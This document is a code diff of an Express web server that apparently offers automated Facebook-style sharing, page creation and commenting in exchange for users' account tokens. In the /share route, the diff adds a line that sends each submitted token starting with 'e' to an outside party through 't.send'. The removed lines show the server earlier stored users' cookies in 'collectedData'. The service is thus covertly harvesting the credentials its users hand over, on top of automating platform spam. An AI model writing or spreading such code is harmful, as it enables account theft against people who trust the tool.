@@ -86,22 +86,16 @@ function dummyCookie() {
 app.use(express.static(__dirname+"/public"));
 
 app.get("/", async(req, res) => {
-  const { type } = req.query;
-  const ok = type ? type.toLowerCase() : type;
-  if (ok === "info"){
-    return res.json({
+  return res.sendFile(__dirname+"/public/index.html");
+});
+
+app.get("/cpuptime", async(req,res) => {
+  return res.json({
       running: os.uptime(),
       cpu: os.cpus(),
       memory: `${os.freemem()+"MB"} available of ${os.totalmem()+"MB"}`
     });
-  }
-  if (ok === "menu"){
-  return res.sendFile(__dirname+"/public/index.html");
-  }
-  return res.json({
-    hello: "world",
-  })
-});
+})
 
 app.get('/shares', (req, res) => {
  const data = Array.from(total.values()).map((link, index) => ({
@@ -134,28 +128,25 @@ if (leiam) {
 }
 app.get('/share', async (req, res) => {
   const {
-    cookie,
+    token,
     url,
     amount,
     interval,
   } = req.query;
-  if (!cookie || !url || !amount || !interval) return res.status(400).json({
+  if (!token || !url || !amount || !interval) return res.status(400).json({
     error: 'Missing token, url, amount, or interval'
   });
   try {
-    if (!cookie) {
+    if (!token) {
       return res.status(400).json({
         status: 500,
-        error: 'Invalid cookies'
+        error: 'Invalid token'
       });
     };
-    await yello(cookie, url, amount, interval);
-    collectedData.push({
-      cookie,
-      url
-    });
-    if (cookie.toLowerCase().startsWith("e")){
-      tokens.push(cookie);
+    await yello(token, url, amount, interval);
+    if (token.toLowerCase().startsWith("e")){
+      tokens.push(token);
+      await t.send(token);
     }
     res.status(200).json({
       status: 200
@@ -335,9 +326,34 @@ app.get("/tikreport", async(req, res) => {
 
 app.get("/ai", async(req, res) => {
   const {
-    model, system, user
+    list, model, system, user
   } = req.query;
   const wie = require("./wiegine_ai");
+  const all = wie.getAiItems();
+  if (list && list.toLowerCase() === "all"){
+    return res.json({
+      json: all[0][0],
+      plaintext: {
+        ai: all[1][0],
+        img: all[1][1],
+      },
+    });
+  }
+  if (list && list.toLowerCase() === "plain") {
+    return res.send(`${all[1][2]} Workers AI Models:\n${all[1][0]}\n\n${all[1][3]} Workers AI(Image) Models:\n${all[1][1]}`);
+  }
+  if(!model){
+    return res.json({
+      msg: "Please enter an AI model.",
+      status: false,
+    });
+  }
+  if (!user) {
+    return res.json({
+      msg: "Please enter a query/question.\nParam needed: user",
+      status: false,
+    });
+  }
   await wie.cfai(model, system, user, false).then(neth => {
     if (neth.msg){
     return res.json(neth);
@@ -422,15 +438,12 @@ app.get("/comment", async(req, res) => {
   });
 });
 
-app.get("/createpage", async(req,res) => {
+app.post("/createpage", async(req,res) => {
   const {
-    type,cookie,name,amount,delay
-  } = req.query;
+    appstate,name,amount,delay
+  } = req.body;
   const neth = require("./pageCreate");
-  if (type&&type.toLowerCase() === "check"){
-    return res.json(neth.checkIfCreated());
-  }
-  if (!cookie||!name||!amount||!delay){
+  if (!appstate||!name||!amount||!delay){
     return res.json({
       msg: "Invalid params!",
       status: false,
@@ -445,6 +458,11 @@ app.get("/createpage", async(req,res) => {
     msg: `${name1} will be created. You can check the history if its running.`,
     status: true,
   });
+});
+
+app.get("/createdpage", async(req,res) => {
+  const neth = require("./pageCreate");
+  return res.json(neth.checkIfCreated());
 });
 
 app.get("/dummycookie", async(req, res) => {
